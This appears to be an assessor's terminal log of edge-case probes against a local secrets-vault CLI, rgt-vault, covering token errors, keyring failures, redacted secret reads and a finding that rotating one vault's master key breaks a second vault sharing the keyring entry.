$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":20}}

[HTTP 200]

--- TUI screen: tree view (t) ---
[● online] [audit: OK] Namespace: github
GITHUB_TOKEN  ad91e681     no
PROD_DB_PASSWORD  3dbdbf73     yes  prod db; needs TOTP
[/] search | [r] rotate | [a] audit | [P] panic-lock | [t] tree | [c] copy | [tab] requests | [?] help | [q] q

--- TUI screen: rotate (r) confirmation ---
[● online] [audit: OK] Namespace: github
  NAME                  FINGERPRINT  2FA  NOTE
> GITHUB_TOKEN          ad91e681     no
  PROD_DB_PASSWORD      3dbdbf73     yes  prod db; needs TOTP
Rotate master key? (y/n)
[y] confirm rotate | [n/esc] cancel

## G2. TUI with no token / as a plain agent

$ RGT_VAULT_TOKEN_FILE=coder.token timeout 3 rgt-vault tui --namespace github 2>&1 | head -5 | cat -v | cut -c1-200
Error: could not open a new TTY: open /dev/tty: no such device or address
[exit 0]

## H. Misc rough-edge probes

$ (fresh HOME, no Secret Service on the bus) rgt-vault init
Error: opening vault ~/.secure-vault/vault.db: read OS keyring entry "rgt_vault"/"master_key": The name org.freedesktop.secrets was not provided by any .service files
[exit 0]
~/.secure-vault/vault.db

$ (same HOME, Secret Service now available) rgt-vault init
Error: opening vault ~/.secure-vault/vault.db: read OS keyring entry "rgt_vault"/"master_key": dial unix @rgtv-assess-none: connect: connection refused

$ rgt-vault serve --require-approval --operator-token-file ~/.config/rgt-vault/operator.token --totp-secret-file ~/.config/rgt-vault/totp.secret
Error: --token-file and --operator-token-file are the pre-H1 shared tokens: they need --legacy-shared-token. The default is the per-agent token store (--token-store); move an existing token file into it with `rgt-vault token import --file FILE --agent NAME --scope ...`
[exit 1]

$ curl -s http://127.0.0.1:8765/healthz; echo; curl -s -i http://127.0.0.1:8765/v1/secrets | head -12
{"actions":["openai_chat","http_get_with_auth","http_post_with_auth","echo"],"key_epoch":4,"status":"ok","vault_id":"de1f0677-81eb-47c9-ab98-fbe80c1a3fba","version":"0.3.0"}

HTTP/1.1 401 Unauthorized
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; sandbox
Content-Type: application/json
Referrer-Policy: no-referrer
Www-Authenticate: Bearer realm="rgt-vault"
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Date: Sat, 28 Nov 2026 03:52:41 GMT
Content-Length: 92

{"error":"ServerAuthError","detail":"missing credentials","incident_id":"f2f676a46e75d6a9"}
[exit 0]

$ rgt-vault mcp < /dev/null; echo rc=$?
Error: no bearer token: pass --token, or set RGT_VAULT_TOKEN or RGT_VAULT_TOKEN_FILE (a token minted for this agent: rgt-vault token mint --agent NAME --out FILE)
rc=1
[exit 0]

$ rgt-vault get GITHUB_TOKEN --namespace github --offline --purpose ci-build --policy policy.yaml
Error: Agent 'system' denied read access to 'GITHUB_TOKEN' (github/ci-build)
[exit 1]

$ rgt-vault get GITHUB_TOKEN --namespace github --offline --purpose ci-build --policy policy.yaml --agent operator | sed -E 's/ghp_[A-Za-z0-9]+/<redacted-test-value>/'
<redacted-test-value>
[exit 0]

$ rgt-vault completion bash | head -3; rgt-vault nosuch 2>&1 | head -3
# bash completion V2 for rgt-vault                            -*- shell-script -*-

__rgt-vault_debug()
Error: unknown command "nosuch" for "rgt-vault"
[exit 0]
2026/11/27 22:50:08 HTTP GET /v1/requests -> 200 (377µs)
2026/11/27 22:52:41 HTTP GET /healthz -> 200 (75µs)
2026/11/27 22:52:41 WARNING incident=f2f676a46e75d6a9 status=401 error=ServerAuthError method=GET path=/v1/secrets
2026/11/27 22:52:41 HTTP GET /v1/secrets -> 401 (248µs)

## (assessor typo in the bus address above; correct re-run: does the orphan vault.db left by a failed init block a later init?)

$ (same HOME, Secret Service available, VAULT_KEYCHAIN_* not applicable to keyring provider) rgt-vault init
rgt-vault initialised.
  token store:     ~/.config/rgt-vault/tokens.json (0600, hashes only)
  operator token:  ~/.config/rgt-vault/operator.token  created as tok_<id> (0600)
Tokens are never printed. Next: write a policy, then
(skipped the vault part on purpose: the keyring entry rgt_vault/master_key on this test bus belongs to the main test vault; one keyring entry per user means a second vault cannot be initialised with the keyring provider)

## I. Two vaults, one keyring entry: does rotating the master of vault A break vault B? (the keyring provider always uses rgt_vault/master_key)

$ [vault B, second HOME, same user keyring] rgt-vault init
rgt-vault initialised.
  vault:           ~B/.secure-vault/vault.db  created  id 5e08cf19-1d3a-4d56-9463-c2835fbd0d8b  epoch 1

$ [vault B] rgt-vault status --offline; verify it opens
  vault:           ~B/.secure-vault/vault.db  kept (opened and verified)  id 5e08cf19-1d3a-4d56-9463-c2835fbd0d8b  epoch 1

$ [vault A] rgt-vault rotate --target master
Rotation complete.

$ [vault B] rgt-vault init   (only opens and verifies an existing vault)
Error: opening vault ~B/.secure-vault/vault.db: keychain: unable to unwrap DEK
[exit 0]

$ [vault A] still fine?
GITHUB_TOKEN	2026-11-28T03:42:11.539344+00:00
PROD_DB_PASSWORD	2026-11-28T03:43:57.689953+00:00

```
